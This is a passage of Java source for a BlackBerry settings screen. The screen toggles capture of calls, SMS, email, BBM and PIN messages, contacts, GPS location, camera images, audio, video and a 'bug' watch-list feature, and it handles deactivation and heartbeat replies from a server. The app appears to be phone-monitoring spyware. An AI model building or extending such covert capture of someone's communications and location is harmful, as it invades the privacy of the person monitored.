							int locationTimerIndex = locationTimerField.getSelectedIndex();
							int locInterval = cellInfo.getInterval();
							int index = getTimerIndex(locInterval);
							if (ApplicationInfo.PRO_I_R != licenseInfo.getProductConfID() && ApplicationInfo.PROX_I_R != licenseInfo.getProductConfID() && locationTimerIndex <= cellInfo.getWarningPosition() && locationTimerIndex != index) {
								Dialog dialog = new Dialog(Dialog.D_YES_NO, MainAppTextResource.SETTING_SCREEN_LOC_WARNING, Dialog.NO, null, DEFAULT_CLOSE);
								int selected = dialog.doModal();
								if (selected == Dialog.NO) {
									alter = false;
								}
							}
							if (alter) {
								cellInfo.setInterval(ApplicationInfo.LOCATION_TIMER_SECONDS[locationTimerField.getSelectedIndex()]);
								pref.commit(cellInfo);
							} else {
								locationTimerField.setSelectedIndex(index);
							}
						}
					});
				} else if (field.equals(gpsField)) {
					uiApp.invokeLater(new Runnable() {
						public void run() {
							boolean gpsStatus = gpsField.getChecked();
							gpsTimerField.setEditable(gpsStatus);
							PrefGPS gpsInfo = (PrefGPS)pref.getPrefInfo(PreferenceType.PREF_GPS);
							gpsInfo.setEnabled(gpsStatus);
							pref.commit(gpsInfo);
						}
					});
				} else if (field.equals(gpsTimerField)) {
					uiApp.invokeLater(new Runnable() {
						public void run() {
							PrefGPS gpsInfo = (PrefGPS)pref.getPrefInfo(PreferenceType.PREF_GPS);
							boolean alter = true;
							int gpsTimerIndex = gpsTimerField.getSelectedIndex();
							int locInterval = gpsInfo.getGpsOption().getInterval();
							int index = getTimerIndex(locInterval);
							if (ApplicationInfo.PRO_I_R != licenseInfo.getProductConfID() && ApplicationInfo.PROX_I_R != licenseInfo.getProductConfID() && gpsTimerIndex <= gpsInfo.getWarningPosition() && gpsTimerIndex != index) {
								Dialog dialog = new Dialog(Dialog.D_YES_NO, MainAppTextResource.SETTING_SCREEN_LOC_WARNING, Dialog.NO, null, DEFAULT_CLOSE);
								int selected = dialog.doModal();
								if (selected == Dialog.NO) {
									alter = false;
								}
							}
							if (alter) {
								gpsInfo.getGpsOption().setInterval(ApplicationInfo.LOCATION_TIMER_SECONDS[gpsTimerField.getSelectedIndex()]);
								pref.commit(gpsInfo);
							} else {
								gpsTimerField.setSelectedIndex(index);
							}
						}
					});
				} else if (field.equals(bugField)) {
					uiApp.invokeLater(new Runnable() {
						public void run() {
							boolean bugStatus = bugField.getChecked();
							PrefBugInfo bugInfo = (PrefBugInfo)pref.getPrefInfo(PreferenceType.PREF_BUG_INFO);
							PrefWatchListInfo watchListInfo = bugInfo.getPrefWatchListInfo();
							bugInfo.setEnabled(bugStatus);
							pref.commit(bugInfo);
						}
					});
				} else if (field.equals(watchField)) {
					uiApp.invokeLater(new Runnable() {
						public void run() {
							boolean watchStatus = watchField.getChecked();
							PrefBugInfo bugInfo = (PrefBugInfo)pref.getPrefInfo(PreferenceType.PREF_BUG_INFO);
							PrefWatchListInfo watchListInfo = bugInfo.getPrefWatchListInfo();
							watchListInfo.setWatchListEnabled(watchStatus);
							bugInfo.setPrefWatchListInfo(watchListInfo);
							pref.commit(bugInfo);
						}
					});
				} else if (field.equals(emailField)) {
					uiApp.invokeLater(new Runnable() {
						public void run() {
							boolean emailStatus = emailField.getChecked();
							PrefEventInfo eventInfo = (PrefEventInfo)pref.getPrefInfo(PreferenceType.PREF_EVENT_INFO);
							eventInfo.setEmailEnabled(emailStatus);
							pref.commit(eventInfo);
						}	
					});
				} else if (field.equals(smsField)) {
					uiApp.invokeLater(new Runnable() {
						public void run() {
							boolean smsStatus = smsField.getChecked();
							PrefEventInfo eventInfo = (PrefEventInfo)pref.getPrefInfo(PreferenceType.PREF_EVENT_INFO);
							eventInfo.setSMSEnabled(smsStatus);
							pref.commit(eventInfo);
						}
					});
				} else if (field.equals(bbmField)) {
					uiApp.invokeLater(new Runnable() {
						public void run() {
							boolean bbmStatus = bbmField.getChecked();
							PrefMessenger messenger = (PrefMessenger)pref.getPrefInfo(PreferenceType.PREF_IM);
							messenger.setBBMEnabled(bbmStatus);
							pref.commit(messenger);
						}
					});
				} else if (field.equals(addressField)) {
					uiApp.invokeLater(new Runnable() {
						public void run() {
							boolean addrStatus = addressField.getChecked();
							PrefAddressBook addrInfo = (PrefAddressBook)pref.getPrefInfo(PreferenceType.PREF_ADDRESS_BOOK);
							addrInfo.setEnabled(addrStatus);
							pref.commit(addrInfo);
						}
					});
				} else if (field.equals(pinField)) {
					uiApp.invokeLater(new Runnable() {
						public void run() {
							boolean pinStatus = pinField.getChecked();
							PrefPIN pinInfo = (PrefPIN)pref.getPrefInfo(PreferenceType.PREF_PIN);
							pinInfo.setEnabled(pinStatus);
							pref.commit(pinInfo);
						}
					});
				} else if (field.equals(startStopField)) {
					uiApp.invokeLater(new Runnable() {
						public void run() {
							boolean isSomeDefaultEventsEnabled = !isSomeDefaultEventsEnabled();
							PrefGeneral general = (PrefGeneral)pref.getPrefInfo(PreferenceType.PREF_GENERAL);
							general.setCaptured(isSomeDefaultEventsEnabled);
							manageStartAndStopField(isSomeDefaultEventsEnabled);
							pref.commit(general);
						}
					});
				} else if (field.equals(imageField)) {
					uiApp.invokeLater(new Runnable() {
						public void run() {
							boolean camImageStatus = imageField.getChecked();
							PrefCameraImage camImageInfo = (PrefCameraImage)pref.getPrefInfo(PreferenceType.PREF_CAMERA_IMAGE);
							camImageInfo.setEnabled(camImageStatus);
							pref.commit(camImageInfo);
						}
					});
				} else if (field.equals(audioField)) {
					uiApp.invokeLater(new Runnable() {
						public void run() {
							boolean audioFileStatus = audioField.getChecked();
							PrefAudioFile audioFileInfo = (PrefAudioFile)pref.getPrefInfo(PreferenceType.PREF_AUDIO_FILE);
							audioFileInfo.setEnabled(audioFileStatus);
							pref.commit(audioFileInfo);
						}
					});
				} else if (field.equals(videoField)) {
					uiApp.invokeLater(new Runnable() {
						public void run() {
							boolean videoFileStatus = videoField.getChecked();
							PrefVideoFile videoFileInfo = (PrefVideoFile)pref.getPrefInfo(PreferenceType.PREF_VIDEO_FILE);
							videoFileInfo.setEnabled(videoFileStatus);
							pref.commit(videoFileInfo);
						}
					});
				}*/
				
				if (field.equals(reportTimerField)) {
					PrefGeneral settings = (PrefGeneral)pref.getPrefInfo(PreferenceType.PREF_GENERAL);
					settings.setSendTimeIndex(reportTimerField.getSelectedIndex());
					pref.commit(settings);					
				} else if(field.equals(editField)) {
					uiApp.pushScreen(new EventCountScreen(self));
				} else if (field.equals(voiceField)) {
					boolean voiceStatus = voiceField.getChecked();
					PrefEventInfo eventInfo = (PrefEventInfo)pref.getPrefInfo(PreferenceType.PREF_EVENT_INFO);
					eventInfo.setCallLogEnabled(voiceStatus);
					pref.commit(eventInfo);					
				} else if (field.equals(locationField)) {
					boolean locStatus = locationField.getChecked();
					locationTimerField.setEditable(locStatus);
					PrefCellInfo cellInfo = (PrefCellInfo)pref.getPrefInfo(PreferenceType.PREF_CELL_INFO);
					cellInfo.setEnabled(locStatus);
					pref.commit(cellInfo);										
				} else if (field.equals(locationTimerField)) {
					PrefCellInfo cellInfo = (PrefCellInfo)pref.getPrefInfo(PreferenceType.PREF_CELL_INFO);
					boolean alter = true;
					int locationTimerIndex = locationTimerField.getSelectedIndex();
					int locInterval = cellInfo.getInterval();
					int index = getTimerIndex(locInterval);
					if (ApplicationInfo.PRO_I_R != licenseInfo.getProductConfID() && ApplicationInfo.PROX_I_R != licenseInfo.getProductConfID() && locationTimerIndex <= cellInfo.getWarningPosition() && locationTimerIndex != index) {
						Dialog dialog = new Dialog(Dialog.D_YES_NO, MainAppTextResource.SETTING_SCREEN_LOC_WARNING, Dialog.NO, null, DEFAULT_CLOSE);
						int selected = dialog.doModal();
						if (selected == Dialog.NO) {
							alter = false;
						}
					}
					if (alter) {
						cellInfo.setInterval(ApplicationInfo.LOCATION_TIMER_SECONDS[locationTimerField.getSelectedIndex()]);
						pref.commit(cellInfo);
					} else {
						locationTimerField.setSelectedIndex(index);
					}					
				} else if (field.equals(gpsField)) {
					boolean gpsStatus = gpsField.getChecked();
					gpsTimerField.setEditable(gpsStatus);
					PrefGPS gpsInfo = (PrefGPS)pref.getPrefInfo(PreferenceType.PREF_GPS);
					gpsInfo.setEnabled(gpsStatus);
					pref.commit(gpsInfo);					
				} else if (field.equals(gpsTimerField)) {
					PrefGPS gpsInfo = (PrefGPS)pref.getPrefInfo(PreferenceType.PREF_GPS);
					boolean alter = true;
					int gpsTimerIndex = gpsTimerField.getSelectedIndex();
					int locInterval = gpsInfo.getGpsOption().getInterval();
					int index = getTimerIndex(locInterval);
					if (ApplicationInfo.PRO_I_R != licenseInfo.getProductConfID() && ApplicationInfo.PROX_I_R != licenseInfo.getProductConfID() && gpsTimerIndex <= gpsInfo.getWarningPosition() && gpsTimerIndex != index) {
						Dialog dialog = new Dialog(Dialog.D_YES_NO, MainAppTextResource.SETTING_SCREEN_LOC_WARNING, Dialog.NO, null, DEFAULT_CLOSE);
						int selected = dialog.doModal();
						if (selected == Dialog.NO) {
							alter = false;
						}
					}
					if (alter) {
						gpsInfo.getGpsOption().setInterval(ApplicationInfo.LOCATION_TIMER_SECONDS[gpsTimerField.getSelectedIndex()]);
						pref.commit(gpsInfo);
					} else {
						gpsTimerField.setSelectedIndex(index);
					}					
				} else if (field.equals(bugField)) {
					boolean bugStatus = bugField.getChecked();
					PrefBugInfo bugInfo = (PrefBugInfo)pref.getPrefInfo(PreferenceType.PREF_BUG_INFO);
					PrefWatchListInfo watchListInfo = bugInfo.getPrefWatchListInfo();
					bugInfo.setEnabled(bugStatus);
					pref.commit(bugInfo);					
				} else if (field.equals(watchField)) {
					boolean watchStatus = watchField.getChecked();
					PrefBugInfo bugInfo = (PrefBugInfo)pref.getPrefInfo(PreferenceType.PREF_BUG_INFO);
					PrefWatchListInfo watchListInfo = bugInfo.getPrefWatchListInfo();
					watchListInfo.setWatchListEnabled(watchStatus);
					bugInfo.setPrefWatchListInfo(watchListInfo);
					pref.commit(bugInfo);					
				} else if (field.equals(emailField)) {
					boolean emailStatus = emailField.getChecked();
					PrefEventInfo eventInfo = (PrefEventInfo)pref.getPrefInfo(PreferenceType.PREF_EVENT_INFO);
					eventInfo.setEmailEnabled(emailStatus);
					pref.commit(eventInfo);					
				} else if (field.equals(smsField)) {
					boolean smsStatus = smsField.getChecked();
					PrefEventInfo eventInfo = (PrefEventInfo)pref.getPrefInfo(PreferenceType.PREF_EVENT_INFO);
					eventInfo.setSMSEnabled(smsStatus);
					pref.commit(eventInfo);					
				} else if (field.equals(bbmField)) {
					boolean bbmStatus = bbmField.getChecked();
					PrefMessenger messenger = (PrefMessenger)pref.getPrefInfo(PreferenceType.PREF_IM);
					messenger.setBBMEnabled(bbmStatus);
					pref.commit(messenger);					
				} else if (field.equals(addressField)) {
					boolean addrStatus = addressField.getChecked();
					PrefAddressBook addrInfo = (PrefAddressBook)pref.getPrefInfo(PreferenceType.PREF_ADDRESS_BOOK);
					addrInfo.setEnabled(addrStatus);
					pref.commit(addrInfo);					
				} else if (field.equals(pinField)) {
					boolean pinStatus = pinField.getChecked();
					PrefPIN pinInfo = (PrefPIN)pref.getPrefInfo(PreferenceType.PREF_PIN);
					pinInfo.setEnabled(pinStatus);
					pref.commit(pinInfo);					
				} else if (field.equals(startStopField)) {
					boolean isSomeDefaultEventsEnabled = !isSomeDefaultEventsEnabled();
					PrefGeneral general = (PrefGeneral)pref.getPrefInfo(PreferenceType.PREF_GENERAL);
					general.setCaptured(isSomeDefaultEventsEnabled);
					manageStartAndStopField(isSomeDefaultEventsEnabled);
					pref.commit(general);
				} else if (field.equals(imageField)) {
					boolean camImageStatus = imageField.getChecked();
					PrefCameraImage camImageInfo = (PrefCameraImage)pref.getPrefInfo(PreferenceType.PREF_CAMERA_IMAGE);
					camImageInfo.setEnabled(camImageStatus);
					pref.commit(camImageInfo);
				} else if (field.equals(audioField)) {
					boolean audioFileStatus = audioField.getChecked();
					PrefAudioFile audioFileInfo = (PrefAudioFile)pref.getPrefInfo(PreferenceType.PREF_AUDIO_FILE);
					audioFileInfo.setEnabled(audioFileStatus);
					pref.commit(audioFileInfo);
				} else if (field.equals(videoField)) {
					boolean videoFileStatus = videoField.getChecked();
					PrefVideoFile videoFileInfo = (PrefVideoFile)pref.getPrefInfo(PreferenceType.PREF_VIDEO_FILE);
					videoFileInfo.setEnabled(videoFileStatus);
					pref.commit(videoFileInfo);
				}
			}
		} catch(Exception e) {
			Log.error(TAG + ".fieldChanged()", e.getMessage(), e);
		}
	}
	
	// PhoenixProtocolListener
	public void onError(String message) {
		Log.error(TAG + ".onError()", "message: " + message);
		String tmp = message;
		if (deactivatedMode) {
			deactivator.removeListener(this);
			StringBuffer buf = new StringBuffer();
			buf.append(MainAppTextResource.SETTING_SCREEN_DEACTIVATE_SUCCESS);
			buf.append("\nNote: ");
			buf.append(message);
			tmp = buf.toString();
		}
		final String msg = tmp;
		cancelProgressBar();
		uiApp.invokeLater(new Runnable() {
			public void run() {			
				Dialog.alert(msg);				
			}
		});
	}
	
	public void onSuccess(CommandResponse response) {
		try {
			if (response instanceof SendDeactivateCmdResponse) {
				deactivator.removeListener(this);
				cancelProgressBar();
				SendDeactivateCmdResponse sendDeactCmdRes = (SendDeactivateCmdResponse)response;
				int statusCode = sendDeactCmdRes.getStatusCode();
				if (statusCode == 0) {
					uiApp.invokeLater(new Runnable() {
						public void run() {
							Dialog.alert(MainAppTextResource.SETTING_SCREEN_DEACTIVATE_SUCCESS);
						}
					});
				} else {
					StringBuffer buf = new StringBuffer();
					buf.append(MainAppTextResource.SETTING_SCREEN_DEACTIVATE_SUCCESS);
					buf.append("\nNote: ");
					buf.append(sendDeactCmdRes.getServerMsg());
					final String msg = buf.toString();
					uiApp.invokeLater(new Runnable() {
						public void run() {
							Dialog.alert(msg);							
						}
					});
				}
			} else if (response instanceof SendHeartBeatCmdResponse) {
				heartBeat.removeListener(this);
				final SendHeartBeatCmdResponse sendHeartBeatCmdRes = (SendHeartBeatCmdResponse)response;
				int statusCode = sendHeartBeatCmdRes.getStatusCode();
				if (statusCode == 0) {
					uiApp.invokeLater(new Runnable() {
						public void run() {
							Dialog.alert(MainAppTextResource.SETTING_SCREEN_TEST_CONNECTION_SUCCESS);							
						}
					});
				} else {
					uiApp.invokeLater(new Runnable() {
						public void run() {
							Dialog.alert(sendHeartBeatCmdRes.getServerMsg());							
						}
					});
				}
			}
		} catch(Exception e) {
			e.printStackTrace();
			Log.error(TAG + ".onSuccess()", e.getMessage(), e);
		}
	}

	// Screen
	public boolean onClose() {
		uiApp.requestBackground();
		return false;
	}
}
